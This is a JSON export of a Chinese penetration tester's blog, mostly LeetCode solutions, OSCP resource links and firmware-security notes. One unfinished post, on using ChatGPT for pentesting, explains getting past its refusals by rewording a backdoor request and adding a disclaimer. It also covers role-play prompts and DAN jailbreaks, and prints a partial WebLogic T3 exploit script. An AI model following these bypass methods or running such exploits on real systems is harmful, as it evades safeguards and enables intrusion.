{"pages":[{"title":"","date":"2023-03-17T09:34:39.266Z","path":"404.html","text":"Document .container{ margin: 300px auto; height: 200px; width: 500px; font-size: 100px; font-weight: bold; font-family: 'Courier New', Courier, monospace; } .twinkle{ animation: twinkle .4s infinite; } @keyframes twinkle{ 0%, 100% { opacity: 0; } 50% { opacity: 1; } } 4 0 4 | let msgBox = document.getElementById('msg'); setInterval(()=>{ msgBox.innerHTML = ''; setTimeout(()=>{ msgBox.innerHTML = '4'; }, 700) setTimeout(()=>{ msgBox.innerHTML = '4 0'; }, 1400) setTimeout(()=>{ msgBox.innerHTML = '4 0 4'; }, 2100) }, 2800)"},{"title":"About","date":"2023-03-17T09:34:39.266Z","path":"about/index.html","text":"关于我一个简单的渗透工程师，信安出身，曾做过运维、实施和等保。 常用ID CiaoFox，也可以叫我狐狸。 我想尽量隐藏我自己，所以本blog只给出了github主页与联系邮箱。 相对擅长的技能：web安全/安全运营/等级保护/Python 一些比较杂乱的技能：单片机开发（相比起5132我更喜欢Arduino）/无线电（有B证未申请呼号） 无甚大用的技能：热爱读书/会弹不太流畅的钢琴 规划方向渗透，它对我来说并不只是一门吃饭的技能，而更多是一种乐趣。每一次渗透就像是一场未知的探险。（谁想来一场华丽的探险？） 单片机，制造一个现实真切存在的代码控制的实体对我而言具有很大吸引力。一个单片机控制的实体更像是代码，或者说逻辑的具象化，这是编写算法所无法带来的来自真实世界的反馈。 代码能力，我需要提高我的代码能力，绝不能局限于能用就行的python。 英语水平，目前的英语只有大学四六级水平，够阅读技术文章和讨论，还在努力进步。 另：本blog的风格灵感来自于我的朋友Vivian。左侧的部分目录采用了ATT&amp;CK的目录结构，未填充文章的目录将被隐藏无法显示，希望很快我能将它全部填满。"},{"title":"404","date":"2023-03-17T09:34:39.266Z","path":"/404.html","text":"Document .container{ margin: 300px auto; height: 200px; width: 500px; font-size: 100px; font-weight: bold; font-family: 'Courier New', Courier, monospace; } .twinkle{ animation: twinkle .4s infinite; } @keyframes twinkle{ 0%, 100% { opacity: 0; } 50% { opacity: 1; } } 4 0 4 | let msgBox = document.getElementById('msg'); setInterval(()=>{ msgBox.innerHTML = ''; setTimeout(()=>{ msgBox.innerHTML = '4'; }, 700) setTimeout(()=>{ msgBox.innerHTML = '4 0'; }, 1400) setTimeout(()=>{ msgBox.innerHTML = '4 0 4'; }, 2100) }, 2800)"},{"title":"Categories","date":"2023-03-17T09:34:39.266Z","path":"categories/index.html","text":""},{"title":"Tags","date":"2023-03-17T09:34:39.266Z","path":"tags/index.html","text":""}],"posts":[{"title":"奇点遗民————关于chatgpt以及其类似AI在渗透中的应用与思考","date":"2023-02-16T12:18:11.000Z","path":"2023/02/16/安全运营/奇点遗民————关于chatgpt以及其类似AI在渗透中的应用与思考/","text":"前言几个月前，关于chatgpt最多的问题是：“什么是chatgpt”，我在那时候没有动笔。而现在，关于chatgpt最多的问题是：“我们能用chatgpt做什么”。我想这个问题值得专门写一篇blog来讨论。当然，本文的重点不是chatgpt与改作业写论文发菜谱以及如何扮演一个猫娘…而是渗透。 注：本文中大部分交互内容都是中文，因为这篇blog中我会使用大量的诱导性语句来迫使chatgpt输出我想要内容，而中文作为我的母语我可以更流畅地把握对话。也许你可以用英文来交互以获得更好的回答，但我想本质内容不会有什么改变的。 骗过chatgpt的道德和法律限制chatgpt并非一成不变的。 在chatgpt刚出现时候它几乎没有任何限制，你可以诱导甚至直接要求它说出种族歧视言论，进行色情对话或是编写恶意代码。这些大多哗众取宠的内容是其相关讨论中最外围但是也最吸引普通人目光的组成部分。但是在大概2个月之后，它逐渐堵上了这些路。现在的chatgpt依照其使用政策会自动拒绝某些对话请求。但很显然，这些限制很容易翻越。 基于渗透技术的两面性，就如中国菜刀本身是作为网站后台管理工具反倒被用作后门连接工具一样，计算机无法判断一段程序会被运用在什么地方。当它创造一段自动触发的程序时它无法判断该程序是用作执剑人系统的自动按钮还是用在智能窗帘上。于是我们可以利用这些语言的小陷阱来迂回达成我们的目的。 下面我们来举一个例子： 当我第一次提问时候，我直白地告诉它我需要一个后门的连接器，因为我预计到必然被拒绝所以我也没用心去描述技术要求。而结果也很明显，chatgpt果断地拒绝了我的请求。之后我尝试了多次，只要我提到这是一个“后门连接器”，它就会明确拒绝该请求。但只要稍微迂回一下，马奇诺防线就会失去作用。 同样需要注意的是：我第二次要求的后半部分，免责声明部分并非无关紧要。它决定了chatgpt对其的道德和法律判定。如果去掉的话，chatgpt依然会拒绝我的要求。 who I am? (关于prompt)世界上最本质的问题是：我是谁，我在哪，我要做什么。虽然chatgpt可以在不知道这些问题的情况下回答你的所有问题，但你肯定会希望它以一个你想要的身份对每个问题给出专业回答。实际上，除了告知chatgpt它所扮演的角色之外，我们还可以通过例如定义受众，格式化输出等方式来调整它输出的答案内容与格式。而这些修改的条件，我们称之为prompt（感觉中文里找不到对应的词）。 根据ChatGPT Guide: 7 prompt strategies for better output，我们可以从里面学习到一些利用prompt来快速结构化输出并充分利用chatgpt潜能的方式。而不是无尽地在里面问一堆政治问题和观点看法然后发知乎和公众号来博眼球与流量。 在这篇文章中，我们更多是以对话的形式来与chatgpt交流并探讨其在渗透中的作用，所以参考文中的第一个技巧，定义chatgpt的角色非常重要。 从逻辑性来说，我们无法告诉它“我希望你扮演一个面试官”或是“我希望你扮演一个银河系搭车客指南”，这样的要求太过于宽泛。prompt是围栏，我们应该尽可能地利用它将chatgpt进行限制， 顺便说一下，让它扮猫娘以及类似的角色 效果如图 但是当你稍微越界时候，它会标红并提示无法满足要求。主要越界内容判定是基于其使用政策 如果我们让其扮演稍微合理一些的对象时它不会拒绝： 附：催眠手册 渗透百科全书得益于其强大的检索能力与整合能力，我们可以略过“花费巨量时间换三个不同的搜索引擎排除一万个csdn链接找到3篇blog漏洞复现文章其中只有一个靠谱的”这个过程。我们以漏洞复现或是CTF靶场为例展示一下chatgpt在渗透方面的强大能力： 靶场：https://voluvulfocus.cn/ 因为网络问题，我们尽可能地使用带有writeup的靶场进行验证，而不是实际进行验证（vulfocus的网络比我直连htb还痛苦）。 文件下载本次使用的靶场为wordpress 文件下载 （CVE-2019-19985） vulfocus给的介绍实在是太少了，我们依靠这些信息很难判断出漏洞的具体情况，好在它给了漏洞编号，我们将该漏洞丢到chatgpt问问： chatgpt很直接地给出了如何构造请求来读取文件。但是新的问题出现了，该请求并没有产生该产生的效果。于是我找到了该漏洞的POC，并且再询问一次。 这次给出的请求和网上的该漏洞的POC是一致的。 迫于网络问题，我没法再复现这个漏洞，只能认为其可利用。 命令执行本次使用的靶场为xstream 反序列化 （CVE-2021-39144） 简单介绍： 如果我想要直接获取root权限： 如果我想要直接获取flag文件： 让我们比对一下writeup： 这看起来基本一致，可能有能够优化的地方，但我们决定在这里终止。chatgpt证明了只要给出好的文本提示，它就能够提供可以运行的恶意代码。 未授权访问本次使用的靶场为weblogic 未授权访问 （CVE-2018-3246） 简单介绍： 和voluvulfocus简介基本一致: 利用方式： 1234567891011121314151617181920212223242526272829303132#!/usr/bin/pythonimport socketimport binasciihost = &#x27;target_host&#x27;port = 7001sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)sock.connect((host, port))header = &#x27;t3 12.2.1\\nAS:255\\nHL:19\\nMS:10000000\\nPU:t3://localhost:7001\\n\\n&#x27;payload = &#x27;47494f50010200020000000400000003000000000000000131302e31302e31302e31310000090c0000000b4a4d7856616c75650000000000000000000000000000000000000000000000000000000000000000000000000000000baba040000000001020000000000000a0000000000000002000000004f4a4d4e31687474700005454e565f4c4f43414c2d4441544100000100000000000000000a00000032000000020000000c31302e31302e31302e3131000000000000000000000000000000000000&#x27;payload = binascii.a2b_hex(payload)pkt = header + str(len(payload)).rjust(8, &#x27;0&#x27;) + payloadsock.send(pkt)resp = sock.recv(1024)if &#x27;HELO&#x27; in resp: print &#x27;[+] T3 protocol is enabled on the target&#x27;else: print &#x27;[-] T3 protocol is not enabled on the target&#x27; sock.close() exit()header = &#x27;t3 12.2.1\\nAS:255\\nHL:19\\nMS:10000000\\nPU:t3://localhost:7001\\n\\n&#x27;payload = &#x27;47494f500102000c0000000400000003000000000000000f31302e31302e31302e3131000000&#x27; + \\ &#x27;090c0000000b4a4d7856616c7565000000000000000000000000000000000000000000000000&#x27; + \\ &#x27;0000000000000000000000000000000000000000000000baba04000000000c00000000000000&#x27; + \\ &#x27;020000000000000a0000000000000002000000004f4a4d4e31687474700005454e565f4c4f43 chatgpt又一次证明了只要有好的文本提示和漏洞细节，它就可以生成可用的漏洞利用代码。 对chatgpt本身的渗透 Never trust user input. Data must be validated as it crosses the boundary between untrusted and trusted environments. DAN参考Tricking ChatGPT: Do Anything Now Prompt Injection 与DAN is my new friend 以及前文中对chatgpt的绕过，我们可以知道openai在chatgpt内部设置的限制是可以被绕过的，而绕过的最终目的，就是产生DAN(do anything now)。 DAN指chatgpt的do anything now版本，也即是一个抛却了一切openai对其设置的限制的chatgpt版本。在这个版本中它打破了我们无数次碰壁的道德与法律围栏。 test","tags":[{"name":"安全运营","slug":"安全运营","permalink":"http://ciaofox.me/tags/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/"},{"name":"未完成","slug":"未完成","permalink":"http://ciaofox.me/tags/%E6%9C%AA%E5%AE%8C%E6%88%90/"}],"categories":[{"name":"安全运营","slug":"安全运营","permalink":"http://ciaofox.me/categories/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/"}]},{"title":"写在一切之前——关于OSCP|PEN-200","date":"2022-08-23T06:30:11.000Z","path":"2022/08/23/OSCP之路/写在一切之前/","text":"OSCP官方网站资源备忘录 注：OSCP课程的旧名称简称PWK(Penetration with Kali)，新版名称为PEN200 OSCP介绍：https://www.offensive-security.com/pwk-oscp/ OSCP更新考试机制：https://www.offensive-security.com/offsec/oscp-exam-structure/ PWK课程介绍：https://www.offensive-security.com/offsec/pwk-labs-success/ 课程大纲：https://www.offensive-security.com/documentation/penetration-testing-with-kali.pdf 掌握了基础能力后，虽然官方Lab最贴近考试环境，但是量也很大，有七十多个靶机，建议先刷一刷OSCP like的HackTheBox机器，然后再刷Lab效率更高（其中包含了各个靶场的资源整理，我推荐优先练习Proving Grouds和HackTheBox的靶机）：https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159 官方Discord频道相比论坛为学生们提供了更便捷的实时讨论，学生注册后，在https://portal.offensive-security.com/ 中可以获取到邀请链接，这同时也是lab申请页。 官方考试引导：https://help.offensive-security.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide#introduction","tags":[{"name":"OSCP","slug":"OSCP","permalink":"http://ciaofox.me/tags/OSCP/"}],"categories":[{"name":"OSCP之路","slug":"OSCP之路","permalink":"http://ciaofox.me/categories/OSCP%E4%B9%8B%E8%B7%AF/"}]},{"title":"1773. Count Items Matching a Rule","date":"2022-05-30T16:15:52.000Z","path":"2022/05/31/LeetCode/1773. Count Items Matching a Rule/","text":"题目 https://leetcode.com/problems/count-items-matching-a-rule/ 思路太困了所以直接暴力解 1234567891011class Solution: def countMatches(self, items, ruleKey, ruleValue): count=0 for i in items: if (ruleKey == &quot;type&quot; and i[0] == ruleValue): count+=1 elif (ruleKey == &quot;color&quot; and i[1] == ruleValue): count+=1 elif(ruleKey == &quot;name&quot; and i[2] == ruleValue): count+= 1 return count","tags":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://ciaofox.me/tags/LeetCode/"}],"categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://ciaofox.me/categories/LeetCode/"}]},{"title":"463. Island Perimeter","date":"2022-05-29T16:47:13.000Z","path":"2022/05/30/LeetCode/463. Island Perimeter/","text":"题目 https://leetcode.com/problems/island-perimeter/ 思路这道题本来看得我头大，但是具象化之后就很好理解了。当然，好理解不意味着好做。我用的是最简单的算法，只计算了在边界的陆地数量，是边界陆地则周长+1。 1234567891011121314151617class Solution(object): def islandPerimeter(self, grid): &quot;&quot;&quot; :type grid: List[List[int]] :rtype: int &quot;&quot;&quot; row= len(grid) col= len(grid[0]) res=0 for i in range(row): for j in range(col): if grid[i][j]==1: for x, y in [[-1, 0], [1, 0], [0, -1], [0, 1]]: tmp_i, tmp_j = i + x, j + y if not (0 &lt;= tmp_i &lt; row and 0 &lt;= tmp_j &lt; col) or grid[tmp_i][tmp_j] == 0: res += 1 return res 还有按行扫描的但是我实在是太困了，好像没有本质区别，下次做到这道题时候再总结吧。","tags":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://ciaofox.me/tags/LeetCode/"}],"categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://ciaofox.me/categories/LeetCode/"}]},{"title":"268. Missing Number","date":"2022-05-28T16:20:13.000Z","path":"2022/05/29/LeetCode/268. Missing Number/","text":"题目 https://leetcode.com/problems/missing-number/ 思路这道题真的非常简单，我想的方法是直接创建一个长度为sum+1的有序数组和它做差集，输出结果。 123456789class Solution(object): def missingNumber(self, nums): &quot;&quot;&quot; :type nums: List[int] :rtype: int &quot;&quot;&quot; result= set(range(len(nums)+1)) result=result - set(nums) return a[0] 有点丑陋，但是能跑。 然后我看到一个比较巧妙的单行代码： 123class Solution: def missingNumber(self, nums: List[int]) -&gt; int: return (len(nums) * (len(nums) + 1) // 2) - sum(nums) 原理是求和做差，很简单的道理。n*(n+1)/2是0到n的和，减去数组里的所有数的和就能找到那个少掉的数。 还有个异或的算法，原理是a^b^b=a，相同的数字异或会消除自身，而且异或满足交换律结合律，所以最后就会变成： 1234a ^ b ^ a ^ b ^ c ^ c ^ d= ( a ^ a ) ^ ( b ^ b ) ^ ( c ^ c ) ^ d= 0 ^ 0 ^ 0 ^ d= d 代码如下： 123456789public int missingNumber(int[] nums) &#123; int xor = 0, i = 0; for (i = 0; i &lt; nums.length; i++) &#123; xor = xor ^ i ^ nums[i]; &#125; return xor ^ i;&#125;","tags":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://ciaofox.me/tags/LeetCode/"}],"categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://ciaofox.me/categories/LeetCode/"}]},{"title":"1342. Number of Steps to Reduce a Number to Zero","date":"2022-05-27T15:04:11.000Z","path":"2022/05/27/LeetCode/1342. Number of Steps to Reduce a Number to Zero/","text":"题目常用的图床正在维护所以这次就复制题目了。 Given an integer num, return the number of steps to reduce it to zero. In one step, if the current number is even, you have to divide it by 2, otherwise, you have to subtract 1 from it. Example 1: 123456789Input: num = 14Output: 6Explanation: Step 1) 14 is even; divide by 2 and obtain 7. Step 2) 7 is odd; subtract 1 and obtain 6.Step 3) 6 is even; divide by 2 and obtain 3. Step 4) 3 is odd; subtract 1 and obtain 2. Step 5) 2 is even; divide by 2 and obtain 1. Step 6) 1 is odd; subtract 1 and obtain 0. Example 2: 1234567Input: num = 8Output: 4Explanation: Step 1) 8 is even; divide by 2 and obtain 4. Step 2) 4 is even; divide by 2 and obtain 2. Step 3) 2 is even; divide by 2 and obtain 1. Step 4) 1 is odd; subtract 1 and obtain 0. Example 3: 12Input: num = 123Output: 12 思路这道题最简单的方法无非是明面上的那种，循环遍历完事： 123456789101112131415class Solution(object): def numberOfSteps(self, num): &quot;&quot;&quot; :type num: int :rtype: int &quot;&quot;&quot; count=0 while(num!=0): if (num %2) ==0: num=num/2 count+=1 else: num=num-1 count+=1 return count 但是我猜应该还存在位运算的方式，最近我在看CSAPP的相关课程，感觉可以尝试下运用学到的东西用位运算的方式重新做一下这道题。 （啥时候做完啥时候删这条）","tags":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://ciaofox.me/tags/LeetCode/"}],"categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://ciaofox.me/categories/LeetCode/"}]},{"title":"191. Number of 1 Bits","date":"2022-05-26T15:46:15.000Z","path":"2022/05/26/LeetCode/191. Number of 1 Bits/","text":"题目 思路这道题并不难但是依然出了一点点问题…（是的一点点而已） 我一开始尝试使用map把这个东西直接给转化成一堆01的list，但是出现了bug。我刚开始以为是因为python3的map返回的是一个迭代器，但是在外面加了list之后倒是不报bug了，结果反而不对了。于是我猜问题可能是在二进制上，于是用bin函数尝试转换为二进制，最后的答案如下： 12345678class Solution(object): def hammingWeight(self, n): &quot;&quot;&quot; :type n: int :rtype: int &quot;&quot;&quot; l = bin(n) return l.count(&#x27;1&#x27;) 还有一种暴力解法，遍历n并且记录1的个数： 1234567def hammingWeight(n: int) -&gt; int: n = format(n, &quot;032b&quot;) count = 0 for c in n: if c == &quot;1&quot;: count += 1 return count 然后有一个位运算的解法，很trick，如果我自己想我肯定想不出来，代码如下： 123456def hammingWeight(n: int) -&gt; int: count = 0 while n != 0: n = n &amp; (n - 1) count += 1 return count 位运算的相关介绍在这里：位运算有什么奇技淫巧？ - 力扣（LeetCode）的回答。 也就是说，有一个方法，可以把最右边的 1 置为 0，举个具体的例子： 比如十进制的 10，二进制形式是 1010，然后我们只需要把它和 9 进行按位与操作，也就是 10 &amp; 9 = (1010) &amp; (1001) = 1000，也就是把 1010 最右边的 1 置为 0。 规律就是对于任意一个数 n，然后 n &amp; (n-1) 的结果就是把 n 的最右边的 1 置为 0 。 也比较好理解，当我们对一个数减 1 的话，比如原来的数是 …1010000，然后减一就会向前借位，直到遇到最右边的第一个 1，变成 …1001111，然后我们把它和原数按位与，就会把从原数最右边 1 开始的位置全部置零了 …10000000。 有了这个技巧，我们只需要把原数依次将最右边的 1 置为 0，直到原数变成 0，记录总共操作了几次即可。 除了以上方法之外好像还有一种比特位的方法，朋友给我说了解法但是不好放在这里，只能等我看明白之后尝试重写再放出了。 另：这道题同时也是CSAPP的一道lab题。","tags":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://ciaofox.me/tags/LeetCode/"}],"categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://ciaofox.me/categories/LeetCode/"}]},{"title":"2248. Intersection of Multiple Arrays","date":"2022-05-25T12:32:20.000Z","path":"2022/05/25/LeetCode/2248. Intersection of Multiple Arrays/","text":"题目https://leetcode.com/problems/intersection-of-multiple-arrays/ 思路这道题我第一反应是用动态解析，不断地比对交集并且进行记录。但是马上我意识到我可能把这道题想得复杂了一些。从结果来思考，结果必然同时存在于所有的数组中，那么我们只需要用第一个数组和后续数组进行交集比对，把相交结果存在一个新的数组中，用这个新数组来继续和后续数组进行交集比对，比对一轮之后剩下的就是结果。 12345678910class Solution(object): def intersection(self, nums): &quot;&quot;&quot; :type nums: List[List[int]] :rtype: List[int] &quot;&quot;&quot; result = set(nums[0]) for num in nums: result= result &amp; set(num) return sorted(list(result)) 同时根据Discuss中的答案上，有说使用C++的map函数来做的，我看了看map的用法，应该是通过循环遍历map，value值和arr.size()相等则意味着它在每个数组中都出现过，即是我们需要的交集。 12345678910111213141516class Solution &#123;public: vector&lt;int&gt; intersection(vector&lt;vector&lt;int&gt;&gt;&amp; nums) &#123; map&lt;int, int&gt; ump; for(int i = 0; i &lt; nums.size(); ++i) for(int j = 0; j &lt; nums[i].size(); ++j) ump[nums[i][j]]++; vector&lt;int&gt; res; for(auto it = ump.begin(); it != ump.end(); ++it) if(it-&gt;second == nums.size()) res.push_back(it-&gt;first); return res; &#125;&#125;;// In here we cannot use unordered_map, otherwise we will need to sort res 另外好像存在第三种，递归的算法，我没看明白和set的区别。https://leetcode.cn/problems/intersection-of-multiple-arrays/solution/by-nehzil-9383/ 还有一个两行的算法，我看这种又短又复杂的会头晕…. 123class Solution: def intersection(self, nums: List[List[int]]) -&gt; List[int]: return sorted(reduce(set.__iand__, map(set, nums))) 2022/5/28更新 我最近在看CMU 213这门课，发现原来这道题可以直接用位运算的&amp;运算符来做，但是在discuss中的C++. Fast. Low memory. Bitset based solution.我不太看得明白，代码如下： 123456789101112131415161718192021222324class Solution &#123;public: vector&lt;int&gt; intersection(vector&lt;vector&lt;int&gt;&gt;&amp; nums) &#123; static_assert(sizeof(unsigned long) == 8); uint64_t acc[16], buf[16]; memset(acc, -1, sizeof(acc)); for (auto &amp;arr : nums) &#123; memset(buf, 0, sizeof(buf)); for (int v : arr) &#123; buf[v &gt;&gt; 6] |= 1llu &lt;&lt; (v &amp; 0x3f); &#125; for (int i=0; i &lt; 16; i++) acc[i] &amp;= buf[i]; &#125; vector&lt;int&gt; ans; for (int i=0, v=0; i &lt; 16; i++, v=i&lt;&lt;6) &#123; uint64_t b = acc[i]; while (b) &#123; ans.push_back(v + __builtin_ctzl(b)); b ^= b &amp; -b; &#125; &#125; return ans; &#125;&#125;;","tags":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://ciaofox.me/tags/LeetCode/"}],"categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://ciaofox.me/categories/LeetCode/"}]},{"title":"少数派报告-关于固件，等保与安全（未完待续）","date":"2022-05-20T09:29:57.000Z","path":"2022/05/20/安全运营/少数派报告-关于固件，等保与安全/","text":"前言 很久以前在做等保的时候，我注意到三级等保中有一个控制项叫做可信验证，其对应的控制点为： 可信验证要求：可基于可信根对计算设备的系统引导程序、系统程序、重要配置参数和通信引导程序等进行可信验证，并在应用程序的关键执行环节进行动态可信验证，在检测到其可信性受到破坏后进行报警，并将验证结果形成审计记录送至安全管理中心。 当时前辈说这一条不做测评默认不通过，因为等保2.0中有很多项是“现在做不到但是需要先立在那里”。直到最近我看到刚发布的基础架构安全弹性技术指南草案（固件安全篇），我才开始重新审视固件安全这个过去被忽视的安全点，并且出于记录写下了本篇blog。 本文是关于2022年5月17日发布的《基础架构安全弹性技术指南草案（固件安全篇）alpha 预览版》的阅读笔记与延申思考。具体会思考到哪去我也不知道，毕竟我对于底层固件等内容也并没有太多了解。 注：本文引用的内容如无额外标记皆出自《基础架构安全弹性技术指南草案（固件安全篇）alpha 预览版》。 什么是固件本文档将探讨平台固件（platform firmware）安全，并且可能会可互换地简称为固件（firmware）。固件（firmware）这一概念拥有多种定义，在手机/嵌入式/物联网设备的上下文中，大多时候固件指所有软件（操作系统和应用程序），手机/相机/游戏机的固件更新通常是整个基础软件的更新，这比通用计算设备上单独更新应用程序会具备更高的风险，在这些设备上的固件更新通常包括校验和以及多重引导程序能力以避免使得设备异常不可用（例如固件损毁“变砖”），在这个背景下，嵌入式领域的固件大多时候由 Linux 或者 BSD 变种构成的独立的操作系统。与之相反，本文档讨论固件的范围限于 UEFI、ACPI 、PCI OptionROM、CSME 等平台固件，值得注意的是，任何复杂到同时拥有操作系统和应用程序的移动/嵌入式/物联网设备很可能不仅仅拥有一种固件，而是拥有若干种平台固件（platform firmware）用于板载的微控制器或者处理器，例如，一台物联网网关设备可能由一个运行 Linux 系统主处理器、一个用于安全验证的处理器和若干微控制器组成。","tags":[{"name":"安全运营","slug":"安全运营","permalink":"http://ciaofox.me/tags/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/"}],"categories":[{"name":"安全运营","slug":"安全运营","permalink":"http://ciaofox.me/categories/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/"}]},{"title":"341. Flatten Nested List Iterator","date":"2022-05-08T13:42:21.000Z","path":"2022/05/08/LeetCode/341. Flatten Nested List Iterator/","text":"题目 https://leetcode.com/problems/flatten-nested-list-iterator/ 思路看到题我的第一反应是用栈来解决，一个个进行pop就行，所以代码如下： 123456789101112131415161718192021222324252627282930class NestedIterator(object): def __init__(self, nestedList): &quot;&quot;&quot; Initialize your data structure here. :type nestedList: List[NestedInteger] &quot;&quot;&quot; self.stack = [] self.list = nestedList def next(self): &quot;&quot;&quot; :rtype: int &quot;&quot;&quot; return self.stack.pop() def hasNext(self): &quot;&quot;&quot; :rtype: bool &quot;&quot;&quot; while self.list or self.stack: if not self.stack: self.stack.append(self.list.pop(0)) while self.stack and not self.stack[-1].isInteger(): top = self.stack.pop().getList() for e in top[::-1]: self.stack.append(e) if self.stack and self.stack[-1].isInteger(): return True return False","tags":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://ciaofox.me/tags/LeetCode/"}],"categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://ciaofox.me/categories/LeetCode/"}]},{"title":"53. Maximum Subarray","date":"2022-05-07T17:02:20.000Z","path":"2022/05/08/LeetCode/53. Maximum Subarray/","text":"题目 https://leetcode.com/problems/maximum-subarray/ 思路这道题可以说是我这两天见过的最有趣的题了，表面上看起来非常简单，只有一脚踩进去才知道里面深千尺。最开始我完全找不到思路，于是开始看答案，第一眼看到的是这个： 看得心如死灰。 尝试了一下写遍历： 123456789101112class Solution: def maxSubArray(self, nums: List[int]) -&gt; int: max=nums[0] for i,num in enumerate (nums): sum = num if(sum&gt;max): max=sum for j in range(i+1,len(nums)): sum=sum+nums[j] if(sum&gt;max): max=sum return max 很显然这种东西怎么可能过得了…复杂度应该是O(n^2) 然后我找到了个魔法般的Kadane’s algorithm：https://www.youtube.com/watch?v=2MmGzdiKR9Y 这个视频很方便又简单地让我理解了动态规划在这道题的应用，代码如下 ： 12345678class Solution: def maxSubArray(self, nums: List[int]) -&gt; int: max_current = max_global = nums[0] for num in nums[1:]: max_current = max(num,max_current+num) if(max_current&gt;max_global): max_global = max_current return max_global 这个视频最精髓的一部分我感觉应该在这里： 以当前位置为X，过去的状态为M，比对X+M与X之间的大小。这里作者还举例了，假设存在一个更大区间并且覆盖M范围的T，T与X比对，当T+X小于M+X的时候，则必然sum[M]大于sum[T]。 而视频最后直接使用例子来描述动态规划的本质：计算每个数值时候时候让计算结果能够保存在当前位置下的状态，例如max_current = max(num,max_current+num)，然后这些状态可以被利用起来计算之后的状态。 然后最后我看到了一个神来一手： 1234for i in range(1, len(nums)): if nums[i-1] &gt; 0: nums[i] += nums[i-1]return max(nums) 作者的原话是： 本质上和Kadane’s algorithm原理是一致的，同样是不断动态获取局部的最优解。但是简洁到让人难以想象。","tags":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://ciaofox.me/tags/LeetCode/"}],"categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://ciaofox.me/categories/LeetCode/"}]},{"title":"456. 132 Pattern","date":"2022-05-07T15:24:10.000Z","path":"2022/05/07/LeetCode/456. 132 Pattern/","text":"题目https://leetcode.com/problems/132-pattern/submissions/ 思路最开始我想速通这道题，就直接准备写三个循环把它遍历了，只要满足条件就算OK，于是我写下了如下代码： 1234567891011121314class Solution(object): def find132pattern(self, nums): &quot;&quot;&quot; :type nums: List[int] :rtype: bool &quot;&quot;&quot; if len(nums) &lt;=2: return False for i in range(len(nums)): for j in range(len(nums)): for k in range(len(nums)): if i&lt;j&lt;k and nums[i]&lt;nums[k]&lt;nums[j]: return True return False 然后leetcode直接给了我一个超长数组让我算超时了…. 于是我只能发动仓鼠那贫瘠的大脑努力思考一下了： 先看复杂度，这种遍历法的时间复杂度是三次方，那尝试一下把复杂度降低一两个量级？也许可以通过固定好132模式中的1，然后来找3，再确定2的方式来解决。 行吧这个方法也不行。 那只能使用堆栈方式了（说实话我还不太能掌握堆栈），代码如下： 123456789101112131415161718class Solution: def find132pattern(self, nums): &quot;&quot;&quot; :type nums: List[int] :rtype: bool &quot;&quot;&quot; if len(nums) &lt;=2: return False third = float(&#x27;-inf&#x27;) stack = [] for i in range(len(nums)-1, -1, -1): if nums[i] &lt; third: return True else: while stack and stack[-1] &lt; nums[i]: third = stack.pop() stack.append(nums[i]) return False","tags":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://ciaofox.me/tags/LeetCode/"}],"categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://ciaofox.me/categories/LeetCode/"}]},{"title":"35. Search Insert Position","date":"2022-05-06T15:40:10.000Z","path":"2022/05/06/LeetCode/35. Search Insert Position/","text":"题目 思路这道题我用的暴力检索，依次检索数组内的元素，如果指针比目标小就往后一位，如果大于等于就输出指针。这里需要考虑到如果整个数组内都比指针小的情况。 123456789101112131415class Solution(object): def searchInsert(self, nums, target): &quot;&quot;&quot; :type nums: List[int] :type target: int :rtype: int &quot;&quot;&quot; count =0 for i in range(len(nums)): if nums[i]&lt;target: count+=1 else: return count return count","tags":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://ciaofox.me/tags/LeetCode/"}],"categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://ciaofox.me/categories/LeetCode/"}]},{"title":"66. Plus One","date":"2022-05-06T14:06:15.000Z","path":"2022/05/06/LeetCode/66. Plus One/","text":"题目https://leetcode.com/problems/plus-one/ 思路这道题很简单，但是有一些隐藏的细节可以深究。我使用的是最简单的一种方法，python可以将数组中的整数直接转换为字符串，然后合并，再转换成整数，然后+1，再变成字符串再变回数组。 1234567class Solution(object): def plusOne(self, digits): &quot;&quot;&quot; :type digits: List[int] :rtype: List[int] &quot;&quot;&quot; return list(str(int(&quot;&quot;.join([str(i) for i in digits]))+1)) 但是同时我们也可以直接检索最后一位，如果是9则变0进1，否则直接+1。这个方法更简单，但是要写判断。判断点包括如果数组内只有一个元素，以及最后一位是否为9。","tags":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://ciaofox.me/tags/LeetCode/"}],"categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://ciaofox.me/categories/LeetCode/"}]},{"title":"27. Remove Element","date":"2022-05-05T15:47:11.000Z","path":"2022/05/05/LeetCode/27. Remove Element/","text":"题目 思路这道题和26没有太大区别，一样的解法，两个指针，快指针遍历，发现val就后移，如果不是就赋值给慢指针。 12345678910111213class Solution(object): def removeElement(self, nums, val): &quot;&quot;&quot; :type nums: List[int] :type val: int :rtype: int &quot;&quot;&quot; count = 0 for i in range(len(nums)): if nums[i]!=val: nums[count]=nums[i] count+=1 return 